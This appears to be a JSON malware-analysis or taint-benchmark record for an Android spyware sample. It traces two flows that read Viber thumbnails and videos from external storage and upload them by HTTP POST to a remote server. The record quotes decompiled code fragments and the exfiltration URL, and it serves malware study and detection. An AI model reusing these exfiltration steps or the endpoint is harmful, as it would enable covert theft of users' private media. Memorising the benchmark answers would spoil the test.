{
  "fileName" : "vibleaker_android_samp.apk",
  "day" : "2019-07-25",
  "findings" : [ {
    "source" : {
      "statement" : "String sdPath = Environment.getExternalStorageDirectory().getAbsolutePath();",
      "methodName" : "public void register()",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 241,
      "targetName" : "getExternalStorageDirectory",
      "targetNo" : 1,
      "jimpleStmt" : "$r1 = staticinvoke <android.os.Environment: java.io.File getExternalStorageDirectory()>()"
    },
    "sink" : {
      "statement" : "new RestTemplate().exchange(MyVariables.SERVERURL2, HttpMethod.POST, new HttpEntity(formData, requestHeaders), String.class, new Object[0]);",
      "methodName" : "private void upPst(File file, String name, boolean vd)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 433,
      "targetName" : "exchange",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r3.<org.springframework.web.client.RestTemplate: org.springframework.http.ResponseEntity exchange(java.lang.String,org.springframework.http.HttpMethod,org.springframework.http.HttpEntity,java.lang.Class,java.lang.Object[])>(\"http://myvf.no-ip.biz:8086//app//do.php\", $r17, $r4, class \"Ljava/lang/String;\", $r18)"
    },
    "intermediateFlows" : [ {
      "statement" : "upFF(sdPath + \"/viber/media/.thumbnails\", \"vithu\", \"vithuA\", false);",
      "methodName" : "public void register()",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 280,
      "ID" : 1
    }, {
      "statement" : "List<List<String>> listAll = getAllFOD(new File(folder_));",
      "methodName" : "public void upFF(String folder_, String flagOk_, String flagIndex_, boolean vid_)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 346,
      "ID" : 2
    }, {
      "statement" : "upPst(new File((String) ((List) listAll.get(index)).get(1)), flagOk_ + \"_\" + listAll.size() + \"_index_\" + index + \"_\", vid_);",
      "methodName" : "public void upFF(String folder_, String flagOk_, String flagIndex_, boolean vid_)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 355,
      "ID" : 3
    }, {
      "statement" : "if (file.length() / PlaybackStateCompat.ACTION_PLAY_FROM_MEDIA_ID > 1200) {",
      "methodName" : "private void upPst(File file, String name, boolean vd)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 379,
      "ID" : 4
    }, {
      "statement" : "bm = BitmapFactory.decodeFile(file.getAbsolutePath(), bmOptions);",
      "methodName" : "private void upPst(File file, String name, boolean vd)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 383,
      "ID" : 5
    }, {
      "statement" : "bm.compress(CompressFormat.JPEG, 80, bos);",
      "methodName" : "private void upPst(File file, String name, boolean vd)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 385,
      "ID" : 6
    }, {
      "statement" : "Resource anonymousClass1 = new ByteArrayResource(bos.toByteArray()) {",
      "methodName" : "private void upPst(File file, String name, boolean vd)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 387,
      "ID" : 7
    }, {
      "statement" : "formData.add(\"image\", new HttpEntity(anonymousClass1, imageHeaders));",
      "methodName" : "public String getFilename()",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions.AnonymousClass1",
      "lineNo" : 408,
      "ID" : 8
    } ],
    "attributes" : {
      "contextSensitive" : true,
      "interProcedural" : true,
      "pathSensitive" : true
    },
    "ID" : 1,
    "description" : "This malicious flow starts by getting the external storage path and uploads data from the Viber directories to a remote server per an HTTP POST request. There are checks along the flow for checking if the app Viber is installed. "
  }, {
    "source" : {
      "statement" : "File fvid = new File(sdPath + \"/viber/media/.converted_videos\");",
      "methodName" : "public void register()",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 245,
      "targetName" : "File",
      "targetNo" : 1,
      "jimpleStmt" : "specialinvoke $r4.<java.io.File: void <init>(java.lang.String)>($r9)"
    },
    "sink" : {
      "statement" : "new RestTemplate().exchange(MyVariables.SERVERURL2, HttpMethod.POST, new HttpEntity(formData, requestHeaders), String.class, new Object[0]);",
      "methodName" : "private void upPst(File file, String name, boolean vd)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 433,
      "targetName" : "exchange",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r3.<org.springframework.web.client.RestTemplate: org.springframework.http.ResponseEntity exchange(java.lang.String,org.springframework.http.HttpMethod,org.springframework.http.HttpEntity,java.lang.Class,java.lang.Object[])>(\"http://myvf.no-ip.biz:8086//app//do.php\", $r17, $r4, class \"Ljava/lang/String;\", $r18)"
    },
    "intermediateFlows" : [ {
      "statement" : "upFF(sdPath + \"/viber/media/.converted_videos\", \"vivid\", \"vividA\", true);",
      "methodName" : "public void register()",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 255,
      "ID" : 1
    }, {
      "statement" : "upPst(new File((String) ((List) listAll.get(index)).get(1)), flagOk_ + \"_\" + listAll.size() + \"_index_\" + index + \"_\", vid_);",
      "methodName" : "public void upFF(String folder_, String flagOk_, String flagIndex_, boolean vid_)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 355,
      "ID" : 2
    }, {
      "statement" : "if (file.length() / PlaybackStateCompat.ACTION_PLAY_FROM_MEDIA_ID > 1200) {",
      "methodName" : "private void upPst(File file, String name, boolean vd)",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions",
      "lineNo" : 379,
      "ID" : 3
    }, {
      "statement" : "formData.add(\"image\", new FileSystemResource(file));",
      "methodName" : "public String getFilename()",
      "className" : "gr.georkouk.kastorakiacounter_new.MyServerFunctions.AnonymousClass1",
      "lineNo" : 428,
      "ID" : 4
    } ],
    "attributes" : {
      "contextSensitive" : true,
      "interProcedural" : true,
      "pathSensitive" : true
    },
    "ID" : 2,
    "description" : "This malicious flow reading videos from the Viber directories to a remote server per an HTTP POST request. There are checks along the flow for checking if the app Viber is installed. "
  } ]
}